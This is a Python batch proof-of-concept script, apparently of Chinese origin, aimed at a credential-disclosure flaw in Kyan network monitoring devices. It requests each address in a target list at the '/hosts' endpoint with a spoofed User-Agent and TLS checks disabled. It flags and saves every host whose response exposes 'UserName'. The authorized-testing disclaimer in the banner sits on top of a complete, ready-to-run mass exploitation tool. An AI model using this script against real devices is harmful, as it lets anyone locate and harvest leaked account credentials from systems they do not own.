import argparse
import requests
import json

requests.packages.urllib3.disable_warnings()

def banner():
    print("")
    print("***************************************************")
    print("Kyan 网络监控设备 账号密码泄漏漏洞 批量POC")
    print("Author: Bingan")
    print("Date: 2021/04/16")
    print("Location: https://imessy.cn")
    print("***************************************************")
    print("")
    print("***********************警 告************************")
    print("本工具皆在帮助企业快速定位漏洞、修复漏洞，仅限授权安全测试使用！")
    print("请严格遵守《中华人民共和国网络安全法》，禁止未授权非法攻击站点!")
    print("***************************************************")
    print("")
    print("")

def usage():
    parser = argparse.ArgumentParser(description="注意：每行IP需要指明协议，即协议开头")
    parser.add_argument("file",
                        help="包含IP列表的文件，IP每行一个")
    args = parser.parse_args()
    url_file = args.file
    return url_file

def check_bug(ip):
    full_url = ip + "/hosts"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 6.1 Win64 x64 rv:50.0) Gecko/20100101 Firefox/50.0"
    }
    try:
        r = requests.get(full_url, headers=headers, verify=False)
    except requests.exceptions.ConnectionError:
        print(full_url + " -- Connection Error, Maybe WAF!!")
        return False
    if "UserName" in r.text:
        print(full_url + " -- Vulnerable!!")
        return True
    else:
        print(full_url + " -- Not Vulnerable, Maybe Patched!!")
        return False

def main():
    banner()
    ip_file = usage()
    with open(ip_file, "r") as f_r:
        with open("result.txt", "w") as f_w:
            lines = f_r.readlines()
            for line in lines:
                ip = line.strip("\n")
                vulnerable = check_bug(ip)
                if vulnerable == True:
                    f_w.write(ip + "\n")
                else:
                    continue

if __name__ == '__main__':
    main()